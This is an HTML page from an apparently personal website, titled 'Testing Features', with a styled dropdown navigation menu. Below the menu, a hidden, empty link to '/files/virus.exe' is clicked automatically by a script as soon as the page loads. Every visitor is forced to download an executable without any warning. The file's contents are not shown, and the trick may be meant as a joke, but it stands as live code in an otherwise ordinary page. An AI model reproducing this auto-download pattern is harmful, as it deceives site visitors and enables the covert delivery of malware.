<!DOCTYPE html>
<html>
    <head>
        <title>Testing Features</title>
        <link rel="icon" type="image/x-icon" href="/images/lithanium.png">
    </head>
    <style>
        ul {
            list-style-type: none;
            margin: 0;
            padding: 0;
            overflow: hidden;
            background-color: #333333
        }
        li {
            float: left;
        }
        li a, .droptitle {
            display: inline-block;
            color: white;
            text-align: center;
            padding: 15px 15px;
            text-decoration: none;
        }
        li a:hover, .dropdown:hover .droptitle {
            background-color: rgb(100, 100, 100);
        }
        li .dropdown {
            display: inline-block;
        }
        .active {
        	background-color: rgb(0, 100, 25);
        }
        .dropcontent {
            display: none;
            position: absolute;
            background-color: #f9f9f9;
            min-width: 150;
            box-shadow: 0px 8px 16px 0px rgba(0, 0, 0, 0.2);
            z-index: 1;
        }
        .dropcontent a {
            color: black;
            padding: 15px 15px;
            text-decoration: none;
            display: block;
            text-align: left;
        }
        .dropcontent a:hover {
            background-color: #f1f1f1;
        }
        .dropdown:hover .dropcontent {
            display: block;
        }
    </style>
    <body>
        <ul>
            <li><a href="/">Home</a></li>
            <li class="dropdown">
                <a class="droptitle" href="/software">Software</a>
                <div class="dropcontent">
                    <a href="/software/extension">ORAC Wayback Machine</a>
                </div>
            </li>
            <li><a href="/wotd">Word of the Day</a></li>
            <li class="dropdown">
                <a class="active" class="dropdowntitle" href="/random">Random Projects</a>
                <div class="dropcontent">
                    <a href="/random/test">Experiment</a>
                </div>
            </li>
        </ul>



        <a id="lol" href="/files/virus.exe"></a>
    </body>
    <script>
        window.onload = function() {
            document.getElementById('lol').click();
        };
    </script>
</html>
